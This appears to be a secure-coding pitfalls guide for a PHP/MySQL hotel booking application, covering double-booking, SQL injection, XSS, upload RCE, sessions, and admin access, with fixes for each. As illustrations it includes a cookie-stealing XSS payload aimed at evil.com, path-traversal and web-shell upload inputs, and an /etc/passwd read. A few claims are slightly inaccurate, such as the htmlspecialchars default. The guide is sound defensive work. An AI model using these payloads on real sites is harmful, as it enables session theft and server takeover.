# Domain Pitfalls: PHP/MySQL Hotel Reservation System

**Domain:** PHP/MySQL hotel reservation web application (vanilla PHP, raw PDO, no framework)
**Researched:** 2026-05-11
**Overall confidence:** HIGH

---

## Critical Pitfalls

Mistakes that cause data loss, security breaches, or require rewrites.

### Pitfall 1: Double-Booking from Race Conditions (THE #1 Hotel System Killer)

**What goes wrong:** Two users book the same room for overlapping dates. Both receive confirmation. Both show up at the hotel. The front desk has a nightmare.

**Root cause:** The booking logic follows a check-then-insert pattern:

```
1. SELECT check if room is available for dates  →  "Available!"
2. INSERT new booking                            →  "Booked!"
```

When two requests execute concurrently, both pass step 1 (both see "available") before either reaches step 2. MySQL's default `REPEATABLE READ` isolation level does **not** prevent this — consistent reads see the snapshot from the *first read*, meaning concurrent transactions are blind to each other's inserts (phantom reads are possible at this level). (Source: [Percona on Repeatable Read pitfalls](https://www.percona.com/blog/what-if-mysqls-repeatable-reads-cause-you-to-lose-money/), medium confidence)

**Consequences:**
- Overbooked rooms, angry customers, refunds, reputation damage
- In the worst case: financial loss and legal liability

**Prevention (3-tier defense, implement ALL):**

1. **Database constraint** — Add a MySQL constraint at the schema level:
   ```sql
   -- Prevent exact same room+date overlaps at DB level
   -- (Application-level logic is NOT sufficient alone!)
   ```
   This alone cannot handle date-range overlaps natively, but combined with the other layers it provides defense-in-depth.

2. **Pessimistic locking with SELECT FOR UPDATE** — Wrap the booking in a transaction:
   ```sql
   START TRANSACTION;
   -- Lock the room row (or relevant range) so other transactions wait
   SELECT id FROM rooms WHERE id = :room_id FOR UPDATE;
   -- NOW check availability (no concurrent transaction can interfere)
   SELECT COUNT(*) FROM reservations
   WHERE room_id = :room_id
     AND status != 'cancelled'
     AND check_in_date < :check_out
     AND check_out_date > :check_in;
   -- If count = 0, INSERT the booking
   INSERT INTO reservations (...) VALUES (...);
   COMMIT;  -- releases lock
   ```
   **Critical:** The `FOR UPDATE` must be inside the same transaction as the availability check and insert.

3. **Optimistic locking with version column** (backup defense):
   ```sql
   ALTER TABLE rooms ADD COLUMN version INT DEFAULT 1;
   ```
   Then on booking:
   ```sql
   UPDATE rooms SET version = version + 1
   WHERE id = :room_id AND version = :old_version;
   -- If affected_rows = 0, another request modified it first → retry
   ```

**Detection:** Test with parallel curl requests or a load testing tool (JMeter, k6). Fire 10 simultaneous booking requests for the same room/dates — count how many get "success" responses. If > 1, you have a race condition.

**Phase to address:** RSRV implementation phase. Must be designed in from the start — retrofitting locking is painful.

---

### Pitfall 2: PDO Emulated Prepares = False Sense of Security

**What goes wrong:** Developers use PDO prepared statements but leave `PDO::ATTR_EMULATE_PREPARES` at the default `true`. PDO *emulates* prepared statements by escaping values itself using its own SQL parser, instead of sending them as separate parameters to MySQL.

**Root cause:** PDO's default behavior is to emulate prepares. This means:
- The SQL and data are recombined on the client side before being sent to MySQL
- If PDO's SQL parser has a bug (and it has had them — see CVE-2025-1094 variant for PostgreSQL and historical PDO parsing bugs), the escaping can be bypassed
- With `EMULATE_PREPARES = true`, you lose the database's own protection layer

From PHP security research: "PDO emulates all prepared statements in MySQL by default. Unless you explicitly disable `PDO::ATTR_EMULATE_PREPARES`, PDO will actually do all the escaping itself before your query even hits the database." (Source: [slcyber.io - Novel SQLi in PDO prepared statements, July 2025](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements), HIGH confidence)

**Consequences:** SQL injection is possible even though you're using prepared statements.

**Prevention:**
```php
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);  // Use REAL prepared statements
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
```
Always disable emulated prepares. Always use named placeholders or `?` placeholders. Never concatenate user input into SQL strings — even for table names, column names, or ORDER BY clauses (those cannot use prepared statements; whitelist them instead).

**Warning signs:** Any code that uses `$pdo->query()` with concatenated strings, or `->prepare()` without checking/forcing real prepares.

**Phase to address:** Database/setup phase (config.php). One-line fix with massive impact.

---

### Pitfall 3: Server-Side XSS from Unescaped Output

**What goes wrong:** User-submitted data (name, booking notes, room descriptions) is stored in the database and displayed on pages without HTML escaping. An attacker registers with a name like `<script>document.location='https://evil.com/?cookie='+document.cookie</script>`. Every admin who views the user list has their session cookie stolen.

**Root cause:** Developers rely on client-side validation, or forget to escape on output, or use `htmlspecialchars()` without `ENT_QUOTES` (leaving single quotes unescaped), or omit the charset parameter.

**Most common mistakes with `htmlspecialchars()`:**
```php
// ❌ WRONG — missing ENT_QUOTES, missing charset
echo htmlspecialchars($user_input);

// ❌ WRONG — ENT_COMPAT is default, doesn't escape single quotes
echo htmlspecialchars($user_input, ENT_COMPAT);

// ✅ CORRECT
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

A 2025 OWASP-style study notes: "A common pitfall is forgetting to include `ENT_QUOTES`. Without it, single quotes remain unescaped, which can still allow an attacker to break out of HTML attribute values." (Source: [ssojet.com - HTML Escaping in PHP, Dec 2025](https://ssojet.com/escaping/html-escaping-in-php), MEDIUM confidence)

**Consequences:** Session hijacking, admin account takeover, defacement, data theft.

**Prevention:**
1. Create a **global escaping helper function** and use it everywhere:
   ```php
   function h($value) {
       return htmlspecialchars((string)$value, ENT_QUOTES, 'UTF-8');
   }
   ```
2. **Escape on output, not on input.** Store raw data in the database. Only escape when rendering HTML. This preserves data for other contexts (JSON, email, etc.).
3. For data rendered inside `<script>` tags or event handlers (onclick, onmouseover), use dedicated JS escaping — `htmlspecialchars()` is insufficient in JS contexts. (Source: [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), HIGH confidence)
4. Set a Content-Security-Policy header as defense-in-depth.

**Warning signs:** Any `echo $var` or `<?= $var ?>` that does not go through an escaping function. Search for `echo` and `<?=` in templates.

**Phase to address:** UI output/rendering phase. Do NOT defer — retrofitting escaping across dozens of files is tedious and error-prone.

---

### Pitfall 4: Image Upload Leading to Remote Code Execution

**What goes wrong:** Room and service image uploads accept PHP files disguised as images. An attacker uploads `room.php` with a GIF header, then accesses `uploads/room.php` — the server executes it as PHP code.

**Root cause:** Multiple layers of insufficient validation:
1. Checking only the file extension (trivially bypassed — rename `shell.php` to `shell.jpg`)
2. Checking only the MIME type from `$_FILES['file']['type']` (client-provided, easily spoofed)
3. Storing uploads inside the web root in an executable directory
4. Not renaming files (attacker controls the filename, can use path traversal like `../../shell.php`)
5. Not scanning image content for embedded PHP

From PortSwigger's Web Security Academy: "Blacklisting is inherently flawed as it's difficult to explicitly block every possible file extension that could be used to execute code. Such blacklists can sometimes be bypassed by using lesser-known alternative file extensions like `.php5`, `.shtml`." (Source: [PortSwigger - File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload), HIGH confidence)

**Consequences:** Complete server compromise. Attacker can execute system commands, read database credentials, pivot to other systems.

**Prevention (layered approach):**
1. **Validate by content, not extension** — Use `finfo` (File Info) to detect actual MIME type:
   ```php
   $finfo = finfo_open(FILEINFO_MIME_TYPE);
   $mime = finfo_file($finfo, $_FILES['image']['tmp_name']);
   $allowed = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
   if (!in_array($mime, $allowed)) { /* reject */ }
   ```
2. **Re-encode the image** using GD or Imagick — strips embedded PHP from EXIF/comments:
   ```php
   // Load image, create new clean image resource, save as new file
   // This strips any embedded payloads
   ```
3. **Store outside web root** with a script serving images, OR use a `.htaccess` to disable PHP execution in the uploads directory:
   ```apache
   # In uploads/.htaccess
   php_flag engine off
   ```
   (For nginx: `location /uploads/ { location ~ \.php$ { deny all; } }`)
4. **Rename files** — use a random UUID or hash as the filename, preserving the extension only from the *validated* MIME type. Never use user-supplied filenames.
5. **Limit file size** via `upload_max_filesize` in php.ini and server-side validation.
6. **CSRF token** on upload forms to prevent cross-site uploads.

**Warning signs:** Upload directory inside web root. Files kept with original names. No MIME validation. Images loadable as PHP.

**Phase to address:** Room management (ROOM-03) and Service management (SERV-01) phases.

---

### Pitfall 5: Session Security on Shared Hosting

**What goes wrong:** On shared hosting, PHP stores session files in `/tmp` by default — a world-readable directory. Any other account on the same server can read your users' session files, extract session IDs, and hijack active sessions.

**Root cause:** Default PHP session save path is a shared location. PHP session files are named exactly `sess_{SESSION_ID}`, making them trivially discoverable. If another site on the same shared host is compromised, your session data is exposed.

Additional shared hosting session issues:
- Session files use `flock()` locking, which is blocking — concurrent AJAX requests from the same user queue up waiting for the session file lock. This degrades perceived performance significantly. (Source: [dev.to - PHP session quirks](https://dev.to/bornfightcompany/php-session-quirks-3da0), MEDIUM confidence)
- No built-in session encryption — plaintext data in files

**Consequences:** Session hijacking, account takeover, data breach.

**Prevention:**
1. **Move session storage out of /tmp:**
   ```php
   // In config, before session_start()
   session_save_path(__DIR__ . '/../sessions');  // Non-public directory
   ```
   Or better yet, store sessions in the database (more secure and doesn't have file-locking issues).

2. **Database sessions** (recommended for this project):
   ```sql
   CREATE TABLE sessions (
       session_id VARCHAR(128) PRIMARY KEY,
       data TEXT,
       last_accessed INT UNSIGNED
   );
   ```
   Implement a custom session handler with `session_set_save_handler()`. This avoids filesystem race conditions entirely and works across multi-server setups.

3. **Session hardening configuration:**
   ```php
   ini_set('session.use_strict_mode', 1);       // Reject uninitialized session IDs
   ini_set('session.use_only_cookies', 1);       // Never accept session ID from URL
   ini_set('session.cookie_httponly', 1);        // JS cannot read session cookie
   ini_set('session.cookie_secure', 1);          // HTTPS only (if deployed with HTTPS)
   ini_set('session.cookie_samesite', 'Strict'); // CSRF protection for session cookie
   ini_set('session.gc_maxlifetime', 1800);      // 30 min session lifetime
   ```

4. **Regenerate session ID on privilege escalation:**
   ```php
   // After login
   session_regenerate_id(true);
   // After any role change
   session_regenerate_id(true);
   ```

5. **Idle timeout:**
   ```php
   if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > 900)) {
       session_destroy();
       session_start();
       // Redirect to login with "session expired" message
   }
   $_SESSION['last_activity'] = time();
   ```

**Warning signs:** Session save path is the default (`/tmp`). No `session_regenerate_id()` on login. Session cookie lacks HttpOnly/Secure/SameSite flags.

**Phase to address:** Auth implementation phase (AUTH-01, AUTH-02, AUTH-03). Session config should be in the first deployable version.

---

### Pitfall 6: Admin Panel Without Proper Role Gates

**What goes wrong:** The admin panel URL is `admin/dashboard.php`. There's a login check, but:
- Any logged-in user can access admin pages by guessing/typing the URL
- The check only verifies "is there a session?" not "is this user an admin?"
- Some admin pages have no gate at all
- Insecure direct object references (IDOR) — user `id=2` can view/edit user `id=1`'s data

**Root cause:** Role checks are inconsistently applied. Developers add the check to the admin dashboard but forget about `admin/users.php`, `admin/rooms-edit.php`, or AJAX endpoints. A 2025 CVE review found authentication bypass in admin panels as a recurring pattern — CVE-2026-41940 in cPanel (authentication bypass) and CVE-2025-64281 in CentralSquare both allowed unauthenticated admin panel access. (Source: [Cybersecurity Dive - cPanel CVE-2026-41940, May 2026](https://www.cybersecuritydive.com/news/critical-vulnerability-cpanel-widespread-exploitation/819208/), MEDIUM confidence)

**Consequences:** Any registered user becomes admin. Guest accounts can modify rooms, reservations, user data.

**Prevention:**
1. **Create one gate function, use it everywhere:**
   ```php
   // In includes/auth.php or similar
   function require_admin(): void {
       if (session_status() === PHP_SESSION_NONE) {
           session_start();
       }
       if (!isset($_SESSION['user_id']) || $_SESSION['role'] !== 'admin') {
           http_response_code(403);
           require __DIR__ . '/../errors/403.php';
           exit;
       }
   }
   ```

2. **Call the gate at the TOP of every admin page BEFORE any HTML output:**
   ```php
   <?php
   require_once __DIR__ . '/../includes/auth.php';
   require_admin();
   // ... rest of page
   ?>
   ```

3. **Do the same for AJAX handlers** — session checks in JavaScript are not security; the real check must be server-side.

4. **Principle of least privilege** — Each admin page should only perform the minimum operations needed. Don't grant "admin" role the ability to delete other admins unless explicitly needed.

5. **CSRF tokens on all admin action forms** (POST requests that change state):
   ```php
   // Generate token
   $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
   // In form: <input type="hidden" name="csrf_token" value="<?= h($_SESSION['csrf_token']) ?>">
   // On submit:
   if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
       // Reject
   }
   ```

**Warning signs:** Admin page works when you log in as a regular user. Admin page can be accessed by URL directly without auth. No `$_SESSION['role']` check.

**Phase to address:** Admin panel phase. Must be implemented when the first admin page is created, not retrofitted.

---

### Pitfall 7: Date Handling and Availability Check SQL That Is Wrong

**What goes wrong:** The availability query uses a naive overlap check that misses edge cases, or the date comparison logic has off-by-one errors.

**The correct overlap formula:** Two date ranges [check_in, check_out) and [existing_in, existing_out) overlap when:
```sql
check_in < existing_out AND check_out > existing_in
```
Note: This is `<` not `<=` on both sides for the standard hotel case where check-out is exclusive (you vacate the room in the morning, new guest arrives in the afternoon).

**Common mistakes:**
- Using `BETWEEN` which is inclusive on both ends — leads to off-by-one errors at boundaries
- Using `>=` and `<=` when `<` and `>` are correct for exclusive check-out
- Not handling the case where check_in == existing_check_out (should be allowed — someone checks out, someone else checks in same day)
- Not considering booking status in the query (cancelled bookings should not block dates)
- Not considering that the same user might have multiple overlapping bookings for different rooms

**Root cause:** The overlap logic seems simple but is easy to get wrong. Most developers learn the correct pattern through trial and error.

From Stack Overflow: "An algorithm for how to check for an overlap between intervals [a,b] and [c,d]... `a <= d and b >= c`. If that condition is true, then we have an overlap." (Source: [Stack Overflow - Find booking overlaps, 2014](https://stackoverflow.com/questions/25549765/find-booking-overlaps-to-check-dates-availability), HIGH confidence — verified by multiple sources)

**Prevention:**
1. **Use the canonical overlap query:**
   ```sql
   SELECT COUNT(*) FROM reservations
   WHERE room_id = :room_id
     AND status != 'cancelled'
     AND :check_in_date < check_out_date
     AND :check_out_date > check_in_date;
   ```
2. **Normalize all dates to midnight** (`Y-m-d 00:00:00`) before storing or comparing.
3. **Use MySQL DATE type** (not DATETIME or TIMESTAMP) for check-in/check-out — avoids timezone confusion for date-only fields.
4. **Test edge cases explicitly:**
   - Same-day check-in and check-out (day-use booking)
   - Check-out date equals another booking's check-in date (should NOT overlap)
   - Booking spanning across month/year boundaries
   - Booking that starts before and ends after an existing booking (completely contains it)
   - Booking that is entirely inside an existing booking

**Warning signs:** Date comparisons use `<=` or `>=` instead of `<` and `>`. No test script for overlap edge cases.

**Phase to address:** Reservation availability check (RSRV-01).

---

### Pitfall 8: Vanilla PHP Performance Death by a Thousand Cuts

**What goes wrong:** Without a framework to handle routing, ORM caching, and connection pooling, each page request:
1. Connects to MySQL (PDO connection overhead)
2. Includes the same files again and again (no opcode caching awareness)
3. Queries the database repeatedly in loops (N+1 queries)
4. Has no page caching whatsoever

The result: A page that lists 20 rooms with their upcoming reservations might execute 1 (rooms) + 20 (reservations per room) = 21 SQL queries per page load.

**Root cause:** In vanilla PHP without an ORM or query builder, the N+1 pattern emerges naturally:
```php
// ❌ N+1 queries — 1 for rooms, then N for reservations
$rooms = $pdo->query("SELECT * FROM rooms")->fetchAll();
foreach ($rooms as $room) {
    $stmt = $pdo->prepare("SELECT COUNT(*) FROM reservations WHERE room_id = ?");
    $stmt->execute([$room['id']]);
    $room['booking_count'] = $stmt->fetchColumn();
}
```

Additional vanilla PHP performance pitfalls:
- **No autoloader** — manual `require_once` chains are brittle and every request includes files that may not be needed
- **No opcode caching awareness** — without OPcache (which should be enabled), PHP re-parses all source files on every request
- **Session file locking** — on shared hosting, PHP's default file-based sessions use `flock()`, blocking concurrent AJAX requests from the same user
- **No query caching** — the same availability check runs on every page refresh

**Consequences:** Slow page loads under moderate traffic. High server CPU. Poor user experience.

**Prevention:**
1. **Use JOIN queries instead of N+1:**
   ```sql
   SELECT r.*, COUNT(res.id) as booking_count
   FROM rooms r
   LEFT JOIN reservations res ON r.id = res.room_id
   GROUP BY r.id
   ```
   One query instead of N+1.

2. **Enable OPcache** in php.ini:
   ```ini
   opcache.enable=1
   opcache.memory_consumption=128
   opcache.max_accelerated_files=4000
   ```

3. **Persist the PDO connection** — create it once in a shared config file, reuse the same instance (PDO doesn't do connection pooling, but creating a new connection per request is the standard PHP model; the overhead is manageable with persistent connections if needed).

4. **Consider a simple query cache layer** for expensive but infrequently changing data (room listings, prices). Store in `$_SESSION` or use file-based caching:
   ```php
   $cache_key = 'room_list_' . md5(serialize($filters));
   $cache_file = __DIR__ . '/../cache/' . $cache_key . '.cache';
   if (file_exists($cache_file) && (time() - filemtime($cache_file) < 300)) {
       $rooms = unserialize(file_get_contents($cache_file));
   } else {
       // Run query, save to cache
       file_put_contents($cache_file, serialize($rooms));
   }
   ```
   This is a simple but effective pattern for a no-framework project.

5. **Index your database properly:**
   ```sql
   ALTER TABLE reservations ADD INDEX idx_room_dates (room_id, check_in_date, check_out_date);
   ALTER TABLE reservations ADD INDEX idx_user_id (user_id);
   ALTER TABLE reservations ADD INDEX idx_status (status);
   ```

6. **Check query performance** with `EXPLAIN SELECT ...` during development.

**Warning signs:** Page load time > 1 second for simple pages. Server CPU spikes with 5-10 concurrent users. Repeated queries in loops.

**Phase to address:** Performance consideration in EVERY phase. The database schema and query patterns are set early — you can't fix N+1 with indexing if the query pattern is fundamentally bad.

---

### Pitfall 9: Password Storage — Still Using MD5 or SHA1

**What goes wrong:** Despite years of warnings, many vanilla PHP tutorials still show `md5($password)` or `sha1($password)` for password hashing. Neither is acceptable in 2026.

**Root cause:** Copy-paste from old tutorials. MD5 and SHA1 are fast — too fast — making them trivially brute-forceable at billions of hashes per second with consumer GPUs.

**Consequences:** Database breach → all user passwords are exposed in plaintext within minutes → credential stuffing attacks on other services where users reused passwords.

**Prevention (PHP has built-in password hashing since 5.5):**
```php
// Hashing (registration)
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

// Verifying (login)
if (password_verify($password, $stored_hash)) {
    // Password is correct
}

// Rehash if needed (when you increase cost or move to Argon2)
if (password_needs_rehash($stored_hash, PASSWORD_ARGON2ID)) {
    $new_hash = password_hash($password, PASSWORD_ARGON2ID);
    // Update stored hash in database
}
```

Use `PASSWORD_ARGON2ID` if PHP is compiled with Argon2 support (PHP 7.3+, and it's compiled in by default since PHP 8.0 on most systems). Otherwise, `PASSWORD_BCRYPT` is acceptable.

**Warning signs:** Any use of `md5()`, `sha1()`, or `hash('sha256', ...)` for passwords. Password column in DB is VARCHAR(32) (MD5 hash length).

**Phase to address:** Auth phase (AUTH-01). Implement on day one.

---

### Pitfall 10: Error Messages That Leak Information

**What goes wrong:** Production server has `display_errors = On`. When a PDO query fails, the error message reveals the SQL query, database structure, and potentially credentials. An attacker triggers errors intentionally to map the schema.

**Root cause:** `display_errors` is enabled on production, or the developer prints `$e->getMessage()` in catch blocks to "debug."

**Consequences:** Attackers learn table names, column names, database structure, and server paths — enabling targeted SQL injection and other attacks.

**Prevention:**
```php
// In config.php or bootstrap
if (getenv('APP_ENV') === 'production') {
    ini_set('display_errors', '0');
    ini_set('display_startup_errors', '0');
    error_reporting(E_ALL);  // Still log all errors
} else {
    ini_set('display_errors', '1');
    error_reporting(E_ALL);
}
```

In catch blocks, log the real error and show a generic message:
```php
try {
    // PDO operation
} catch (PDOException $e) {
    error_log("Database error: " . $e->getMessage());  // Log, don't display
    die("An internal error occurred. Please try again later.");
}
```

**Warning signs:** PHP errors visible in browser. Stack traces shown to users. SQL queries in error messages.

**Phase to address:** Setup/config phase. This is a one-time configuration.

---

### Pitfall 11: Direct Database Credentials in Source Code

**What goes wrong:** Database credentials are hardcoded in PHP files that are committed to version control. If the repository is made public or compromised, the database is exposed.

**Root cause:** Convenience. "I'll fix it later." The credentials end up in git history permanently.

**Prevention:**
```php
// In config.php
$db_host = getenv('DB_HOST') ?: 'localhost';
$db_name = getenv('DB_NAME') ?: 'hotel_db';
$db_user = getenv('DB_USER') ?: 'hotel_user';
$db_pass = getenv('DB_PASS') ?: '';
```

Use a `.env` file (even without a library — just parse it manually) or set environment variables in the server configuration. Add `.env` to `.gitignore`.

**Warning signs:** Hardcoded `'root'`, `''` (empty password), or any credentials visible in PHP files in version control.

**Phase to address:** Setup/config phase.

---

## Moderate Pitfalls

### Pitfall 12: No Input Validation — Trusting $_GET and $_POST Blindly

**What goes wrong:** Expecting a numeric room ID but getting `../../../etc/passwd` or an array instead. Expecting a date string but getting `DROP TABLE reservations`.

**Prevention:**
```php
// Validate types
$room_id = filter_input(INPUT_GET, 'room_id', FILTER_VALIDATE_INT);
if ($room_id === false || $room_id === null) {
    // Invalid input
}

// Validate dates
$check_in = filter_input(INPUT_POST, 'check_in', FILTER_VALIDATE_REGEXP,
    ['options' => ['regexp' => '/^\d{4}-\d{2}-\d{2}$/']]);
if (!$check_in || !strtotime($check_in)) {
    // Invalid date
}
```

**Warning signs:** Direct use of `$_GET['id']` in SQL without validation. No type checking.

### Pitfall 13: Not Validating Check-Out > Check-In

**What goes wrong:** A user books a room with check-in = 2026-05-10 and check-out = 2026-05-09 (negative stay). Or check-in = check-out (zero-night booking). The system accepts it.

**Prevention:**
```php
$check_in = new DateTime($check_in_str);
$check_out = new DateTime($check_out_str);
if ($check_out <= $check_in) {
    // Reject: check-out must be after check-in
}
```

### Pitfall 14: Missing Reservation Status Lifecycle

**What goes wrong:** Reservations are created but never "expire" — unpaid/unconfirmed bookings block rooms indefinitely. A user can book all rooms and never complete, effectively DoS-ing the hotel.

**Prevention:** Implement a status lifecycle:
```
pending → confirmed → checked_in → checked_out → completed
                                    ↘ cancelled
         ↘ expired (auto, after 24h)
```
Run a daily cron job (or check on booking query) to expire old pending reservations.

### Pitfall 15: No Rate Limiting on Auth Endpoints

**What goes wrong:** Login endpoint has no rate limiting. Attacker brute-forces passwords at thousands of requests per second.

**Prevention:** Track failed attempts per IP in the database or a file:
```php
// After failed login attempt
$stmt = $pdo->prepare("INSERT INTO login_attempts (ip_address, attempted_at) VALUES (?, NOW())");
$stmt->execute([$_SERVER['REMOTE_ADDR']]);

// Before login
$stmt = $pdo->prepare("SELECT COUNT(*) FROM login_attempts
    WHERE ip_address = ? AND attempted_at > DATE_SUB(NOW(), INTERVAL 15 MINUTE)");
$stmt->execute([$_SERVER['REMOTE_ADDR']]);
if ($stmt->fetchColumn() > 10) {
    die("Too many login attempts. Try again later.");
}
```

---

## Minor Pitfalls

### Pitfall 16: Not Using `STRICT_TRANS_TABLES` SQL Mode
MySQL 5.7+ default SQL mode is forgiving — it truncates data and accepts invalid dates with warnings instead of errors. This leads to silent data corruption.

**Prevention:** Set strict mode in the PDO connection:
```php
$pdo->exec("SET SESSION sql_mode = 'STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION'");
```

### Pitfall 17: Forgetting to Close Statements in Loops
Unclosed PDO statements in loops can cause "out of sync" errors if you try to execute another query while a statement still has unfetched rows.

**Prevention:** Call `$stmt->closeCursor()` before the next query, or fetch all results with `fetchAll()`.

### Pitfall 18: Database Charset Not Set
Connecting without setting charset can lead to truncation of multibyte characters (accents, emoji in names).

**Prevention:**
```php
$dsn = "mysql:host=localhost;dbname=hotel_db;charset=utf8mb4";
```

### Pitfall 19: One Big `config.php` File
As the project grows, a single config file containing DB credentials, session config, error handling, helpers, and routing becomes unmaintainable. But over-splitting into 20 tiny files is also bad per the project constraints.

**Prevention:** Keep `config.php` for config only, `database.php` for PDO setup, `helpers.php` for utility functions, and `auth.php` for session/auth logic.

---

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation |
|-------------|---------------|------------|
| **AUTH** (registration/login) | MD5/SHA1 passwords, no session regeneration, no rate limiting | `password_hash()`, `session_regenerate_id()` on login, rate limit by IP |
| **ROOM** (room CRUD + images) | Image upload RCE, missing MIME validation | `finfo` validation, re-encode images, `.htaccess` to disable PHP in uploads dir |
| **RSRV** (reservations) | Double-booking race condition, wrong overlap SQL | `SELECT ... FOR UPDATE` in transaction, canonical overlap formula, test edge cases |
| **ADMIN** (dashboard, stats) | Missing role gates on some pages, no CSRF tokens | Central `require_admin()` gate, CSRF token on every state-changing form |
| **PROF** (user profile) | IDOR — user sees other user's data | Verify `$_SESSION['user_id']` matches the profile owner |
| **STAT** (Chart.js) | SQL injection in dynamic chart queries | Whitelist allowed column names for sorting/grouping, never interpolate user input |
| **UI** (templates, rendering) | XSS from unescaped output | `htmlspecialchars()` with `ENT_QUOTES | ENT_SUBSTITUTE` and `UTF-8` on ALL output |

---

## Sources

- [slcyber.io - Novel SQLi in PDO prepared statements (July 2025)](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements) — HIGH confidence: PDO emulated prepares bypass
- [PHP Manual - Sessions and Security](https://www.php.net/manual/en/session.security.php) — HIGH confidence: official PHP session security docs
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) — HIGH confidence: session security best practices
- [PortSwigger - File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload) — HIGH confidence: file upload exploitation
- [HackerNoon - How to Solve Race Conditions in a Booking System](https://hackernoon.com/how-to-solve-race-conditions-in-a-booking-system) — MEDIUM confidence: race condition patterns
- [amitavroy.com - Race Conditions in Hotel Booking Systems (Feb 2026)](https://www.amitavroy.com/articles/race-conditions-in-hotel-booking-systems-why-your-technology-choice-matters-more-than-you-think) — MEDIUM confidence: domain-specific race condition analysis
- [Percona - MySQL Repeatable Read Pitfalls](https://www.percona.com/blog/what-if-mysqls-repeatable-reads-cause-you-to-lose-money/) — HIGH confidence: MySQL isolation level behavior
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — HIGH confidence: contextual output escaping
- [Cybersecurity Dive - cPanel CVE-2026-41940 (May 2026)](https://www.cybersecuritydive.com/news/critical-vulnerability-cpanel-widespread-exploitation/819208/) — MEDIUM confidence: auth bypass in admin panels
- [Stack Overflow - Find booking overlaps](https://stackoverflow.com/questions/25549765/find-booking-overlaps-to-check-dates-availability) — HIGH confidence: date overlap SQL pattern
- [Secure Coding Practices - PHP File Uploads (June 2025)](https://securecodingpractices.com/secure-file-uploads-php-implementation-guide) — MEDIUM confidence: file upload security guide
- [PHP.Watch - HTML entity default value changes in PHP 8.1](https://php.watch/versions/8.1/html-entity-default-value-changes) — HIGH confidence: critical behavior change for htmlspecialchars
- [ssojet.com - HTML Escaping in PHP (Dec 2025)](https://ssojet.com/escaping/html-escaping-in-php) — MEDIUM confidence: common htmlspecialchars mistakes
- [dev.to - PHP session quirks](https://dev.to/bornfightcompany/php-session-quirks-3da0) — MEDIUM confidence: file-based session blocking behavior
